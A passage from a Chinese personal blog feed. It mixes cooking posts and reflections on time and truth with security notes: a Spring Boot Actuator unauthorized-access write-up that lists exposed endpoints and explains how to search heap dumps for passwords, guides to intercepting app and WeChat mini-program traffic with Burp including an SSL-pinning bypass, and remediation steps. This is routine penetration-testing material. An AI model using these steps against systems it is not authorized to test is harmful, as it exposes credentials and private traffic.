L.）</li><li>其它：<ul><li>杂交皱皮椒</li><li>葱、蒜、姜</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>料酒</li><li>耗油</li><li>香油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>味精</li><li>牛肉酱</li><li>白砂糖</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 洗好切好</p><p>把肉和土豆还有辣椒洗好切好，肉呢还是老样子，腌制一下。至于用什么腌制，看你自己把握，我反正是看着来，什么都加点，况且我的佐料也不多。</p><p>土豆洗好之后需要放水里泡一下，把淀粉过滤掉。</p><blockquote><p>思考：上次是因为没有多余的碗，直接把蒜放在腌制的肉里，我不禁回想到不管是先放蒜再放肉，或是先肉再放蒜的都有，为什么不一起放呢，前后只不过相差不到数秒，真的有很大区别吗，经过对比，感觉味道没有特别大的差别，以后就这样操作了。每个人的习惯都不一样，这东西想怎么搞就怎么搞，好吃就行了。</p></blockquote><p>葱姜蒜切好直接丢腌制肉的碗里。</p><p>第二步 开始操作</p><p>油热，把肥肉也丢进去，把猪油炸出来，然后肉放进去，翻炒几下，我怕不够味道，加入牛肉酱，差不多肉都变成可以食用的样子的颜色时，土豆搞进去翻炒。</p><p>盐、鸡精加点，放味极鲜，差不多了就放辣椒了，然后炒几下，倒入水，放点点糖。</p><p>然后（然后是多久，我也不好描述，这个真的靠感觉，就像我倒车入库，感觉差不多就可以），然后大火收汁，加味精，葱。尝一口土豆，嗯，不错，关火。</p><p><img src="https://lit.enomothem.com/zhixinghe/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230227001205.jpg"></p><p>第三步 出锅</p><p>出锅，指把锅端走（因为我没有多余的碗了，哈哈~）</p><p>总结</p><p>本来只是做辣椒炒肉的，一想还有土豆，就想到加入土豆，没想到别有一番风味啊。</p><p><img src="https://lit.enomothem.com/zhixinghe/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230227001247.jpg"></p><p>优化建议：</p><p>下次用五花肉试试。五花肉土豆块炖一炖。</p><h2 id="Dx-References"><a href="#Dx-References" class="headerlink" title="Dx References"></a>Dx References</h2><p>[1] <a href="https://enomothem.com/posts/24bf.html#toc-heading-6">https://enomothem.com/posts/24bf.html#toc-heading-6</a></p><p>[2] <a href="https://enomothem.com/posts/806d.html">https://enomothem.com/posts/806d.html</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生意义 </tag>
            
            <tag> 土豆炒肉 </tag>
            
            <tag> ECR-2023-0226 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现ECR-2023-0224江西炒粉</title>
      <link href="posts/2adc.html"/>
      <url>posts/2adc.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Introduction"><a href="#Ax-Introduction" class="headerlink" title="Ax Introduction"></a>Ax Introduction</h2><blockquote><p>独立的思维需要自我的沉淀与归纳之后的创新而产生，做菜也是如此。</p></blockquote><p>编号：ECR-2023-0224 江西炒粉</p><p>等级：高赞</p><p>版本：v 1.0</p><blockquote><p>ECR（Enomothem Cooking Recurrence）伊诺烹饪法复现编号，由Enomothem于2023年2月24日由发现第一次做江西炒粉意外好吃而创建第一个编号ECR-2023-0224，用于记录根据平常烹饪而创新得到的好吃的食物，或者是觉得还不错的食物。等级有严赞，高赞，中赞和低赞。</p></blockquote><p>续上回的<a href="https://enomothem.com/posts/24bf.html#toc-heading-6">变量</a>继续谈一谈做饭，很多东西是需要自己思考了才能体会到的，比如看了一个什么道理，你以为你懂了，其实根本就没有，你只是赞同这种做法，但本质还是按照自己认为的去想。当时只是觉得好像和自己认为的差不多，其实差得多。所以说，每个人的思考是不一样的，所以我们需要去思考，当然，思考只是第一步，实践才是真理的客观标准之一，为什么说是之一呢，我认为实践了也不一定是真理，因为真理就在那里，不管你如何理解，它都在那里，我们只是用普世的描述和看起来合乎逻辑的观点定义了这个世界，从物理学的理论框架到实践，人类发现了这些规律，好像一切都说得通，如果你违反那么就并不符合科学，你就是瞎说，还是那句话，这个世界上，每个人都有自己的想法，可能多数人有差不多的看法聚在了一起，然后少部分人有与之完全不同甚至相反的看法，但真理就在那里，不管你怎么认为，也不管少数人或多数人怎么认为，注意，我是不偏袒如何一方的，也就是说，真理是和主观无关的东西，是事实，是客观存在的。而我们说的客观，可能不能称之为客观，真正的客观是狭义客观，人们所说的只是”很多人认为的”，叫宏观客观比较好。</p><p>所以说，真理就像时间一样，它确实存在，但你无法摸到看到，只能通过一些方式方法去呈现出来，比如我们通过蜡烛，香，闹钟，原子钟，电子屏幕，原子的衰变，太阳的东升西落，四季，物理的运动，sql注入的时间延时，你的心跳，车子的运动，你的回忆和幻想，过去，现在，未来，恒星的运动，光的传播，与数据库交互的动态网页，不断记录的服务器的日志，电饭煲的倒计时，还有就是一年又一年的生日。今年过年，家里一切都还是记忆里的那样，但我感觉又不一样，小时候只顾自己开心自己玩，什么都不用管，无脑的玩，确实开心，现在一想自己又穷又没有能力，同龄的孩子已经带着女朋友去拜年，已经为车子和房子而考虑，甚至小孩的幼儿园，培训班等等话题，而我印象中还是那个只会打开电脑玩玩MC，CF，又或者拿爆竹炸炸鱼的那个年纪，其实从很早之前，几年前我就有这个感觉了，越来越没有意思的年味，不变的人和变化的事叠加，而且是每年一变，就会让你感觉像是突然觉悟到，原来就过了这么多年了，真的就是温水煮青蛙一样，就如我的亲戚每年都会和我说问我现在读几年级了，其实我都已经工作了，然后他也惊讶到了，不变的是物质，人和家，变化的是因果，变量，让我们感觉到了时间的存在，时间就是如此，其实时间并不存在，时间只是我们为了呈现或是描述取的一个名字，就如我之前提到的一切时间变化，都是变量，变量就是时间，变量指的就是一切物理在宇宙时空之中的变化，而不变的，那就是物质本身。所以我才说真理就像时间一样，我们所说的真理，或是专家所说的真理，或是大多数人口中的真理，或者是课本中、百度百科中、搜狗百科中、维基百科中、康熙字典中的真理、古人记载的真理，那都可以理解为人类的思想，不能代表真理，就如同我们手上戴的手表不能代表时间一样，确切地说，它【手表】是由金属材料部件构成的架构通过传动导致指针有规律的运动的机器，或是通过电子材料显示的数字，让我们可以观察到数字的变化和或是指针指向的刻度变化。但这只是时间的呈现方式，我们只是为了让生活更加有规律，每天的作息更明确，资本家用来压榨劳动力，想尽办法让工作时间变慢，休息时间变短，但这不是时间，但通过变量，也就是指针的运动，让我们看到了时间，所以我们才知道此时此刻是几点。</p><p>说到<a href="https://enomothem.com/posts/806d.html">指针</a>，我们在学C语言的时候，我们就接触到了指针，C的灵魂就是指针，C不能没有指针，就如同西方不能失去耶路撒冷，江西不能失去江西炒粉。还是那句话，指针之指如同指月之指，如愚见指月,观指不观月;计著名字者,不见我真实。手表上，电脑上，手机上的显示的数字，指的是客观存在的时间，而我们就应该看的是现在处于上午还是晚上的哪一刻，我们应该做什么事情，而不是看手表上那个指针怎么没有对准指到的数字。</p><p>看似跑题了？其实跑题挺严重的，但却是这篇文章不可缺少的一环，因为这是我的思想，我记录下来了，这就是博客存在的意义，你看到的虽然是一行行文字，其实你看到的是我的脑子产生的思想，这个思想你不需要理解或是接受，因为这是我的思想。当然，你可以以你的世界观来评判一下我的世界观，看看有什么不一样，或是有哪些是产生了共鸣的，一个真正开明的思想，是经得住讨论的。所以我并不在乎别人怎么看。</p><p>今天第一次做炒粉，意外的好吃，所以记录一下，平时家常菜也做了不少，比如红烧排骨，排骨汤，回锅肉等等都是第一次做，也感觉不错，做法和网络上教的差不多，所以没有记录下来，但今天炒粉确实令我感觉是我吃过的炒粉最好吃的一次，比饭店都要好吃，但就是平平常常的做法中加入了我个人瞎搞出来的步骤，挺好吃的。要是以后觉得好吃的菜就记录一下吧，方便以后复现。</p><h2 id="Bx-Preparation"><a href="#Bx-Preparation" class="headerlink" title="Bx Preparation"></a>Bx Preparation</h2><p>准备的食材</p><blockquote><p>仅严格记录此次实际的，配料可自由搭配，我用的是湿米粉。</p></blockquote><ul><li>最主要的米粉（Rice flour）</li><li>其它：<ul><li>胡萝卜（Daucus carota L. var. sativa Hoffm.）</li><li>结球甘蓝 （Brassica oleracea var. capitata Linnaeus）</li><li>杂交皱皮椒</li><li>鸡蛋</li><li>肉（瘦肉带一点肥肉）</li><li>葱、蒜、干辣椒</li></ul></li></ul><p>佐料</p><ul><li>食用油</li><li>料酒</li><li>耗油</li><li>香油</li><li>味极鲜</li><li>鸡精</li><li>盐</li><li>味精</li></ul><h2 id="Cx-Recurrence"><a href="#Cx-Recurrence" class="headerlink" title="Cx Recurrence"></a>Cx Recurrence</h2><blockquote><p>复现步骤，味道取决于当时的环境，厨房设施，对细节的把控。所以记录下来尽可能的还原味道。</p></blockquote><p>第一步 泡粉</p><p>用热水把米粉泡个二十分钟，多少分钟不重要，这个时间准备一些配菜。该洗好的洗好切好，卷心菜切一些，胡萝卜切一些，葱切好，蒜末切好。</p><p>肥肉等下用来炼油。瘦肉切好腌制一下，加入食用油、鸡精、盐、味极鲜、料酒、香油。多少自己把握，一点点就够了，抓拌均匀放一边。</p><p>鸡蛋打好搅拌均匀。由于我没有多余的碗，把蒜末直接丢正在腌制的肉里面。</p><p>米粉捞出放入冷水中，然后过滤水分，备用。</p><p>第二步 炒粉</p><p>我是这样的，忘记炼油了，直接到的食用油，然后我的锅是平的，所以我右边倒入鸡蛋，左边倒入肉和蒜末，然后翻炒，差不多了就倒入各种配菜，炒至断生，这时，我想起了我的肥肉，我把肥肉放左边炼油，右边继续翻炒我的菜，炼得差不多把肥肉取出，米粉倒入，直接各种调料一把梭，什么盐啊，耗油，鸡精，味极鲜（我没有老抽生抽，味极鲜是优质的酱油，所以合二为一），干辣椒，大火翻炒，炒得差不多我发现没有切洗葱，这时我急忙取把葱洗了切好，然后加入，再加点味精翻炒几下。</p><p><img src="https://lit.enomothem.com/zhixinghe/20230224235702.jpg"></p><p>第三步 出锅</p><p>关闭电磁炉，将炒粉倒入碗中，品尝。味道好极了。</p><p>总结</p><p>要说创新的地方，其实没有什么创新的地方，只不过是最普通的食材和最普通的烹饪，好吃是因为对时间，火候，变量的掌控。这是关键！</p><p><img src="https://lit.enomothem.com/zhixinghe/20230224235645.jpg"></p><p>优化建议：</p><p>配菜加点小白菜，更加符合江西经典炒粉的特征。</p><p>辣度不是很够，加点小米椒和辣椒油和辣辣椒等等防止出现不辣的情况。</p><h2 id="Dx-References"><a href="#Dx-References" class="headerlink" title="Dx References"></a>Dx References</h2><p>[1] <a href="https://enomothem.com/posts/24bf.html#toc-heading-6">https://enomothem.com/posts/24bf.html#toc-heading-6</a></p><p>[2] <a href="https://enomothem.com/posts/806d.html">https://enomothem.com/posts/806d.html</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 做饭 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 真理 </tag>
            
            <tag> 时间 </tag>
            
            <tag> 江西炒粉 </tag>
            
            <tag> ECR-2023-0224 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF-SpringBoot-Actuator未授权</title>
      <link href="posts/4dd9.html"/>
      <url>posts/4dd9.html</url>
      
        <content type="html"><![CDATA[<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><blockquote><p>这是IRF系列的第一篇。何为IRF，IRF是Enomothem于2023年1月31日提出的漏洞管理信息方法，IRF分别为Information、Recurrence和Fix plan</p><p>I: 漏洞的基本信息、物体Object（什么应用）、时间Time（可选）、空间Space（版本范围，受影响范围）、编号（CVE等等）</p><p>R: 漏洞复现方法、具备的条件</p><p>F: 漏洞修复计划。</p></blockquote><p><strong>基本信息</strong></p><p>Springboot Actuator未授权访问。Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计。</p><p>漏洞分析：在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限。</p><p><strong>OTS</strong></p><ul><li>Spring Boot</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p><strong>分析</strong></p><p>NULL</p><p><strong>复现</strong></p><p><code>Actuator</code> 存在两个版本</p><p>v1</p><pre class=" language-yaml"><code class="language-yaml">/configprops <span class="token comment" spellcheck="true"># 显示所有@ConfigurationProperties</span>/env <span class="token comment" spellcheck="true"># 公开 Spring 的ConfigurableEnvironment</span>/health <span class="token comment" spellcheck="true"># 显示应用程序运行状况信息</span>/httptrace <span class="token comment" spellcheck="true"># 显示 HTTP 跟踪信息</span>/metrics <span class="token comment" spellcheck="true"># 显示当前应用程序的监控指标信息。</span>/mappings <span class="token comment" spellcheck="true"># 显示所有@RequestMapping路径的整理列表</span>/threaddump <span class="token comment" spellcheck="true"># 线程转储</span>/heapdump <span class="token comment" spellcheck="true"># 堆转储</span>/jolokia <span class="token comment" spellcheck="true"># JMX-HTTP桥,它提供了一种访问JMX beans的替代方法</span></code></pre><p>v2</p><pre class=" language-yaml"><code class="language-yaml">/actuator/configprops <span class="token comment" spellcheck="true"># 显示所有@ConfigurationProperties</span>/actuator/env <span class="token comment" spellcheck="true"># 公开 Spring 的ConfigurableEnvironment</span>/actuator/health <span class="token comment" spellcheck="true"># 显示应用程序运行状况信息</span>/actuator/httptrace <span class="token comment" spellcheck="true"># 显示 HTTP 跟踪信息</span>/actuator/metrics <span class="token comment" spellcheck="true"># 显示当前应用程序的监控指标信息。</span>/actuator/mappings <span class="token comment" spellcheck="true"># 显示所有@RequestMapping路径的整理列表</span>/actuator/threaddump <span class="token comment" spellcheck="true"># 线程转储</span>/actuator/heapdump <span class="token comment" spellcheck="true"># 堆转储</span>/actuator/jolokia <span class="token comment" spellcheck="true"># JMX-HTTP桥,它提供了一种访问JMX beans的替代方法</span></code></pre><blockquote><p>其实在实战中，最重要的就是heapdump文件，在这里文件里面理论上可以发现很多敏感的数据库之类的信息</p></blockquote><p>heapdump使用工具解密，工具如下</p><pre class=" language-json"><code class="language-json">https<span class="token operator">:</span>//github.com/wyzxxz/heapdump_tool使用方法：java -jar heapdump_tool.jar heapdump然后选择<span class="token number">1</span>，搜索关键字，如pass<span class="token punctuation">,</span>access</code></pre><h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><p>1.禁用所有接口，将配置改成：endpoints.enabled = false</p><p>2.引入spring-boot-starter-security</p><pre class=" language-txt"><code class="language-txt"># 依赖<dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency></code></pre><p>3.开启security功能，配置访问权限验证，类似配置如下：</p><pre class=" language-txt"><code class="language-txt">management.port=8099management.security.enabled=truesecurity.user.name=xxxxxsecurity.user.password=xxxxx</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IRF </tag>
            
            <tag> Sprintboot </tag>
            
            <tag> 未授权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Charles-拦截APP数据包</title>
      <link href="posts/24bf.html"/>
      <url>posts/24bf.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-准备工作"><a href="#Ax-准备工作" class="headerlink" title="Ax 准备工作"></a>Ax 准备工作</h2><p>使用的工具如下：</p><ul><li>Charles</li><li>Android</li><li>Burp Suite</li><li>太极阴</li><li>JustTrustMe</li></ul><h2 id="Bx-简单使用"><a href="#Bx-简单使用" class="headerlink" title="Bx 简单使用"></a>Bx 简单使用</h2><blockquote><p>怎么抓住人生的“变量”？</p></blockquote><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202135339064.png"></p><h4 id="1-在Charles下设置代理的端口"><a href="#1-在Charles下设置代理的端口" class="headerlink" title="1.在Charles下设置代理的端口"></a>1.在Charles下设置代理的端口</h4><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202152557195.png"></p><h4 id="2-分别在PC端和手机端安装证书"><a href="#2-分别在PC端和手机端安装证书" class="headerlink" title="2.分别在PC端和手机端安装证书"></a>2.分别在PC端和手机端安装证书</h4><h5 id="电脑端"><a href="#电脑端" class="headerlink" title="电脑端"></a>电脑端</h5><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202152715740.png"></p><p>弹出证书，点击安装，将所有的证书都放入下列存储-&gt; 受信任的根证书颁发机构</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202153034816.png"></p><h5 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h5><p>手机端接入电脑使用的网络中，使用手动设置IP地址和端口，均为电脑端的IP和设置的代理端口（如上第一步的操作端口为18888）。</p><p>电脑端，打开Charles如下操作。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202153738925.png"></p><p>手机端，访问如下地址下载证书</p><p><a href="http://chls.pro/ssl">http://chls.pro/ssl</a></p><p>下载证书后安装到手机。各种手机的设置不同，自行查阅。</p><blockquote><p>如无法下载，尝试换一个浏览器，我就是自带的可以，谷歌不行。</p></blockquote><h4 id="3-Burp联动"><a href="#3-Burp联动" class="headerlink" title="3.Burp联动"></a>3.Burp联动</h4><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202155217736.png"></p><p>设置于Burp相同的端口</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202155322826.png"></p><p>Burp导入Charles证书</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202154720754.png"></p><p>保存为xx.p12。设置一个密码。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202154831628.png"></p><p>Burp导入Charles证书</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202154939048.png"></p><p>选择证书，输入密码，导入即可。</p><p>这时，会发现HTTPS的都是UNKOWN<br>1、android7以上不相信证书的问题，很多博客都有写<br>2、开了映射，在映射过程中出现了一些问题</p><p>装太极和JustTrustMe绕过SSL。</p><p>安装好JustTrustMe后，导入到太极阴中。</p><blockquote><p>2023年2月28日 更新解决ssl无法访问问题</p></blockquote><p>最好是证书什么的重新来一遍，电脑端对手机端的端口换一换，解决问题</p><p>打开Proxy  -  External Proxy Setting </p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230228154916373.png"></p><p>可以看到，带有证书的流量。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230228154954184.png"></p><h2 id="Cx-人生的变量"><a href="#Cx-人生的变量" class="headerlink" title="Cx 人生的变量"></a>Cx 人生的变量</h2><p>这几天看三体，其中汪淼做实验时考虑的变量使我有所领悟。</p><p>恒量是什么，是死亡，是静态，世间万物，时刻都在变化。</p><p>人的体重不变，你吃饭了，体重增加，你运动了，经过能量的消耗，体重消耗，变量无处不在。</p><p>漏洞中的变量不也是如此</p><p>你看，市面上多数漏洞扫描工具都是工具POC去扫描，不变的是HTTP标准的请求包格式，变量是漏洞的特有特征</p><p>而站在厂商的角度，一些WAF设备也是根据这些变量，也就是特征去识别漏洞。</p><p>生活中的变量，给我们的启示：</p><p>有时，达成一个目标需要多个条件，或者说多个变量值符合才行。变量是复数，而变量值是单数。</p><p>就比如，我们打开一个网址，我们却无法访问，这是我们需要考虑到所有的变量才行。有时我们会遗漏某个变量，但我们需要全局考虑，从最简单的去考虑，不能局限。</p><ul><li>无法访问网站A，试试能不能访问网站B，以此证明是否接入互联网。</li><li>无法访问网站A，也无法访问网站B，用手机访问或其他人都可以访问，依次证明是自己的问题，而不是外界的问题。</li><li>无法访问网站A，试试浏览器B访问网站A，以此证明浏览器是开了某些代理插件还是浏览器太菜导致无法访问，我推荐使用Chrome</li><li>无法访问网站A，却能访问网站B，切换内网或外网或VPN来访问网站A，以此来证明本地网络是否被防火墙策略拦截限制。</li><li>无法访问网站A，其它网络也无法访问网站A，其它人（的终端）也无法访问网站A，考虑网站A是否被Ddos还是下线了。</li><li>访问网站A加载慢，考虑是否处于请求峰值阶段，如活动双十一节点，春节抢票等等。</li><li>访问网站A加载慢，考虑服务器是否位于国外。</li><li>访问网站A加载慢，考虑是否服务器太小，而服务器内容多。</li><li>访问网站A加载慢，考虑是否服务器带宽小，还是本地网络带宽小。</li><li>访问网站A加载慢，考虑是否服务器网络运营商线路出现故障。</li><li>访问网站A加载慢，考虑是否服务器云提供商出现故障。</li><li>访问网站A加载报错，考虑网站是否受到攻击。</li><li>访问网站A加载报错，考虑访问网站是否携带攻击载荷被拦截。</li><li>访问网站A加载报错，考虑是否运维正在维护。</li><li>等等</li></ul><p>一旦出现与你预期不符的事实时，如果你只考虑简单的几个要素，那你就无法预料出这几个要素以外的情况，就比如我们想象中的很简单啊，一台电脑，连上网不就可以访问了，确实，但有些变量的概率性极低，所以一般我们不会遇到罢了。</p><p>我们再来谈谈外星文明，一旦我们接触了我们无法理解的科技，我们就如同蚂蚁一般，束手无策，感到恐惧。</p><blockquote><p>降维打击就是将攻击目标本身所处的空间维度降低，致使目标无法在低维度的空间中生存从而毁灭目标。</p></blockquote><p><strong>这一切对照人生难道不是吗？</strong></p><p>加速时代每天匆匆忙忙工作，吃快餐、乘快车、赚钱要快、出名要快、甚至升职加薪也要快，这种快状态的心态深层原因是什么呢？</p><p>其实与转型期和未来前景的不确定性，让很多人“心中长草”。</p><p>特别在现在每天遇到海量信息，面对各种诱惑，很多人担心顾此失彼；害怕被时代拉下，被别人超越，让你也就拥有“别人往前跑，自己也不敢停下来”的状态。</p><p>要知道，快变量本身并不是问题，个人角度加速成长，企业角度快速发展；可并不意味着你的压力就该这么大，有时慢下来暂停脚步思考未来的方向或比“快”更重要。</p><p>进一步说，有的人碌碌无为一生并非不努力，而非没有找到“自我成就”，活在各种规定的规则中并未放大价值；我常说你的付出看不到希望的原因在于两方面：</p><p><strong>1. 对内生长，2. 没有对外放大。</strong></p><p>前者，我们所有的学习都在围绕自身向内展开，如跑步，早起，阅读；订阅付费专栏，学习英语，报网络课程等，这属于人生变量中的“有序变量”。</p><p>后者，要求你围绕外部环境展开，把自己所学知识，掌握的技能总结输出，如写作，画画，编程；为更好的理解，你不妨把前者看做培养习惯，把后者看做打造技能。</p><p>因此你就会明白，<strong>我们一生过度培养快变量的对内生长，而忘记慢变量的对外“实力展现”让自身进入新的轨迹中，正是这种观念让自己停滞不前。</strong></p><p><strong>那如何改变呢？</strong></p><p>简单的方法就是将自身拥有的技能实力通过自媒体平台对外放大，这也是普通人第一选择，很多人付出很久却没有质的飞跃，原因在于没有作品思维，没有抓住成事的算法。</p><p>他们总希望干什么都求快，录个视频10分钟搞定就想10万+阅读，最后什么都无法得到；认真思考，慢下来精细化打磨每个环节难道不就是“无序分类变量”中对事情的颗粒化么。</p><p>因此慢很重要，但并不意味着你在行业中就能展露而出，<strong>这里还有9个阶段的算法能够助力你大概率成事：</strong></p><blockquote><ol><li>闭环，2. 迭代，3. 进化，4. 重启，5. 内核，6. 复利，7. 使命，8. 模式，9. 涌现。</li></ol></blockquote><p>前半部分，完美比完成更重要，试着将好几年的工作经验像专家一样量化成产品，每次行动都要进行迭代，并短时间完成快速进化；不断重启自己要有“作品思维”，不去快追变量。</p><blockquote><p>就如对待漏洞的产生，是否足够了解其原理和危害，而不是去想着快速寻找更多的漏洞。</p></blockquote><p>中间部分，对外放大内核足够稳定时，要思考自己的产品（雪球）够不够夯实，能否产生复利。当基础牢固后要为所做事情寻找使命。</p><blockquote><p>如我学习Rust的意义就是想在25岁前保持每年都有一个高质量的安全工具来作为人生的记录。</p></blockquote><p>最后部分，试着寻找自己的商业模式，思考它能否在时间的洪流中经得起时间的考验，对照下，<strong>难道古代老子，孟子，鬼谷子的成事心法不就是这样？</strong></p><blockquote><p>就如Nmap、Sqlmap无法被撼动的地位一样。</p></blockquote><p>总结一下。</p><p>变量有三个兄弟依次为：<strong>数值变量、有序无序的分类变量，快变量和慢变量；</strong>它们时刻都在掌握人生的一艘大船。</p><p>无序代表你做事颗粒化的精准度，有序在研究发展的规律。</p><p>快变量要求你紧抓趋势，慢变量要求你静下心拥有作品思维，一套下来就是小趋势下成事的算法。</p><p>对于普通人而言，终其一生所有的职业生涯难道不是在<strong>为“自我成就”而服务吗？</strong></p><p>职业规划的过程，不正是发现自我人格、自我人生理想的实现和自我潜力的挖掘。</p><p>变量，之所以称之为变量，因为有时你需要慢，而有时，你需要快。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SecTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APP </tag>
            
            <tag> 人生变量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Proxifier-拦截小程序数据包</title>
      <link href="posts/20f3.html"/>
      <url>posts/20f3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-准备工作"><a href="#Ax-准备工作" class="headerlink" title="Ax 准备工作"></a>Ax 准备工作</h2><p>使用的工具如下：</p><ul><li>Proxifier</li><li>微信电脑版</li><li>Burp Suite</li></ul><h2 id="Bx-简单使用"><a href="#Bx-简单使用" class="headerlink" title="Bx 简单使用"></a>Bx 简单使用</h2><p>Burp配置</p><p>导出证书，然后导入到IE</p><p>控制面板-&gt;Internet选项-&gt;内容-&gt;证书-&gt;受信任的根证书颁发机构-&gt;导入-&gt;浏览-&gt;文件类型改为所有就可以看见证书了-&gt;选中证书确定即可</p><p>Proxifier</p><p>首先需要配置Proxifier，首先我们配置Proxy Servers代理服务器（BurpSuite默认监听127.0.0.1:8080）</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230201161547609.png"></p><p>之后再配置代理规则，Applications字段输入WeChatBrowser.exe;WeChatAppEx.exe; 然后Action选择我们刚刚配置的代理服务器并勾上Enable启用即可。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230201161358398.png"></p><p>打开burp监听设置的端口即可。</p><p>打开小程序就有流量了。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230201162046082.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SecTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IRF-Tomcat-Example</title>
      <link href="posts/174b.html"/>
      <url>posts/174b.html</url>
      
        <content type="html"><![CDATA[<h2 id="I"><a href="#I" class="headerlink" title="I"></a>I</h2><blockquote><p>这是IRF系列的第一篇。何为IRF，IRF是Enomothem于2023年1月31日提出的漏洞管理信息方法，IRF分别为Information、Recurrence和Fix plan</p><p>I: 漏洞的基本信息、物体Object（什么应用）、时间Time（可选）、空间Space（版本范围，受影响范围）</p><p>R: 漏洞复现方法、具备的条件</p><p>F: 